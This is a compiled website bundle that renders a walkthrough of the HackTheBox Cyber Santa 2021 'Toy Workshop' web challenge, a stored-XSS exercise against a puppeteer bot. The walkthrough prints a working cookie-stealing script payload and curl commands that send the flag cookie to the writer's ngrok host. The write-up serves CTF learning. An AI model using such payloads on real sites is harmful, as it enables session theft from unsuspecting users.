"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[167],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return d}});var o=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);t&&(o=o.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,o)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,o,a=function(e,t){if(null==e)return{};var n,o,a={},r=Object.keys(e);for(o=0;o<r.length;o++)n=r[o],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(o=0;o<r.length;o++)n=r[o],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=o.createContext({}),p=function(e){var t=o.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return o.createElement(l.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return o.createElement(o.Fragment,{},t)}},h=o.forwardRef((function(e,t){var n=e.components,a=e.mdxType,r=e.originalType,l=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),h=p(n),d=a,m=h["".concat(l,".").concat(d)]||h[d]||u[d]||r;return n?o.createElement(m,i(i({ref:t},c),{},{components:n})):o.createElement(m,i({ref:t},c))}));function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var r=n.length,i=new Array(r);i[0]=h;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:a,i[1]=s;for(var p=2;p<r;p++)i[p]=n[p];return o.createElement.apply(null,i)}return o.createElement.apply(null,n)}h.displayName="MDXCreateElement"},6013:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return p},toc:function(){return c},default:function(){return h}});var o=n(7462),a=n(3366),r=(n(7294),n(3905)),i=["components"],s={title:"Toy Workshop - Web",sidebar_position:3,description:"Walkthrough for the HackTheBox 2021 Cyber Santa competition challenge Toy Workshop in the web category."},l=void 0,p={unversionedId:"HTB - Cyber Santa/toy_workshop",id:"HTB - Cyber Santa/toy_workshop",title:"Toy Workshop - Web",description:"Walkthrough for the HackTheBox 2021 Cyber Santa competition challenge Toy Workshop in the web category.",source:"@site/docs/HTB - Cyber Santa/toy_workshop.md",sourceDirName:"HTB - Cyber Santa",slug:"/HTB - Cyber Santa/toy_workshop",permalink:"/docs/HTB - Cyber Santa/toy_workshop",tags:[],version:"current",sidebarPosition:3,frontMatter:{title:"Toy Workshop - Web",sidebar_position:3,description:"Walkthrough for the HackTheBox 2021 Cyber Santa competition challenge Toy Workshop in the web category."},sidebar:"tutorialSidebar",previous:{title:"Baby Apt - Forensics",permalink:"/docs/HTB - Cyber Santa/baby_apt"},next:{title:"Tutorial - Lightweight Networking Monitoring",permalink:"/docs/network_mon"}},c=[{value:"Challenge Name: Toy Workshop",id:"challenge-name-toy-workshop",children:[{value:"Topic: Web",id:"topic-web",children:[],level:3},{value:"Challenge Prompt",id:"challenge-prompt",children:[],level:3},{value:"Walkthrough",id:"walkthrough",children:[],level:3}],level:2}],u={toc:c};function h(e){var t=e.components,s=(0,a.Z)(e,i);return(0,r.kt)("wrapper",(0,o.Z)({},u,s,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h2",{id:"challenge-name-toy-workshop"},"Challenge Name: Toy Workshop"),(0,r.kt)("h3",{id:"topic-web"},"Topic: Web"),(0,r.kt)("h3",{id:"challenge-prompt"},"Challenge Prompt"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"The work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?")),(0,r.kt)("h3",{id:"walkthrough"},"Walkthrough"),(0,r.kt)("p",null,"This challenge has both a downloadable part and a docker service to accompany it. Download the challenge archive and extract it to see it's a node webserver.",(0,r.kt)("br",{parentName:"p"}),"\n","Start the docker service, going to that service brings us to a fun little animation of packages moving on a conveyor belt.",(0,r.kt)("br",{parentName:"p"}),"\n","Looking through the code given to use, we can see the internal workings of what is presumably running on the docker service. This webserver has a couple interesting files, notably:\n",(0,r.kt)("inlineCode",{parentName:"p"},"database.js"),(0,r.kt)("br",{parentName:"p"}),"\n",(0,r.kt)("inlineCode",{parentName:"p"},"routes/index.js"),(0,r.kt)("br",{parentName:"p"}),"\n",(0,r.kt)("inlineCode",{parentName:"p"},"bot.js"),"  "),(0,r.kt)("p",null,"Lets look at ",(0,r.kt)("inlineCode",{parentName:"p"},"routes/index.js")," first. We can see a route to ",(0,r.kt)("inlineCode",{parentName:"p"},"/api/submit"),' that allows post requests. It looks like its adding a "query" in a sqlite3 db that gets retrieved later. We see there\'s another endpoint at ',(0,r.kt)("inlineCode",{parentName:"p"},"/queries")," that displays the queries submitted to ",(0,r.kt)("inlineCode",{parentName:"p"},"/api/submit")," endpoint. It has a localhost restriction on it though, so my first though it some sort of xss attack later on.",(0,r.kt)("br",{parentName:"p"}),"\n","Switching over to ",(0,r.kt)("inlineCode",{parentName:"p"},"bot.js"),", we see this is where the flag is being set as cookies and where puppeteer is being setup to navigate to the ",(0,r.kt)("inlineCode",{parentName:"p"},"/queries")," endpoint as localhost. This has confirmed the earlier suspicion that it is an XSS attack."),(0,r.kt)("p",null,"Looking at ",(0,r.kt)("inlineCode",{parentName:"p"},"database.js"),", we can see the logic for inserting queries into the database and for displaying them later on. I got stuck on this code for awhile, but it's not as important as the other two.  "),(0,r.kt)("p",null,"Lets send some test queries to ",(0,r.kt)("inlineCode",{parentName:"p"},"/api/submit")," using curl and see what we get back."),(0,r.kt)("p",null,"Command: ",(0,r.kt)("inlineCode",{parentName:"p"},'curl -H "Content-Type: application/json" -d \'{"query": "1234"}\' -X POST 138.68.184.31:30881/api/submit'),"   "),(0,r.kt)("p",null,"Response: ",(0,r.kt)("inlineCode",{parentName:"p"},'{"message":"Your message is delivered successfully!"}')),(0,r.kt)("p",null,"We knew what parameters to supply due to having access to the source code, more specifically that information is found in ",(0,r.kt)("inlineCode",{parentName:"p"},"routes/index.js")," on line 15: ",(0,r.kt)("inlineCode",{parentName:"p"},"const { query } = req.body;"),"  "),(0,r.kt)("p",null,"So we know so far that it's most likely an XSS attack since puppeteer is being used to access the ",(0,r.kt)("inlineCode",{parentName:"p"},"/queries")," endpoint as localhost so lets send some payloads and see what happens.",(0,r.kt)("br",{parentName:"p"}),"\n","Command: ",(0,r.kt)("inlineCode",{parentName:"p"},'curl -H "Content-Type: application/json" -d \'{"query": "<script>console.log(document.cookie)<\/script>}\' -X POST http://138.68.184.31:32360/api/submit'),(0,r.kt)("br",{parentName:"p"}),"\n","Response: ",(0,r.kt)("inlineCode",{parentName:"p"},'{"message":"Your message is delivered successfully!"}')),(0,r.kt)("p",null,"But we have an issue, we can't access ",(0,r.kt)("inlineCode",{parentName:"p"},"/queries")," where the XSS attack will be executed, also this attack will only display our cookies to the console. Not send them to a place we can access. Luckily there's a solution to this issue and it's called ",(0,r.kt)("inlineCode",{parentName:"p"},"ngrok"),".  "),(0,r.kt)("p",null,"Ngrok allows you to tunnel a localhost webserver onto the wide internet. We can do this by first creating a directory for the webserver, then running ",(0,r.kt)("inlineCode",{parentName:"p"},"python -m http.server &")," and then ",(0,r.kt)("inlineCode",{parentName:"p"},"ngrok http 8000"),", after executing that command we'll be given a domain name to use in our attacks."),(0,r.kt)("p",null,"Now lets try an attack from a really useful resource over at ",(0,r.kt)("a",{parentName:"p",href:"https://0xhorizon.eu/cheat-sheet/xss/"},"https://0xhorizon.eu/cheat-sheet/xss/"),'. The "get cookies from another user" is exactly what we\'re looking for. Modifying it with out ngrok domain gives us the following payload:',(0,r.kt)("br",{parentName:"p"}),"\n",(0,r.kt)("inlineCode",{parentName:"p"},'<script>document.location.replace(\\"http://2774-2601-602-87f-9853-7df0-274a-fd62-32ae.ngrok.io?cookie=\\"+document.cookie)<\/script>"')," ",(0,r.kt)("em",{parentName:"p"},"note the escaped strings, that got me for awhile")),(0,r.kt)("p",null,"Inserting this into our curl command gives us the following complete payload:\n",(0,r.kt)("inlineCode",{parentName:"p"},'curl -H "Content-Type: application/json" -d \'{"query": "<script>document.location.replace(\\"http://2774-2601-602-87f-9853-7df0-274a-fd62-32ae.ngrok.io?cookie=\\"+document.cookie)<\/script>"}\' -X POST 138.68.184.31:30881/api/submit')," Execute this payload and wait a couple of seconds and the flag should show in the terminal tab with ngrok:"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"image",src:n(5458).Z})))}h.isMDXComponent=!0},5458:function(e,t,n){t.Z=n.p+"assets/images/flag_ngrok-90da0f460c6bdb8d47b82e7467d83a99.png"}}]);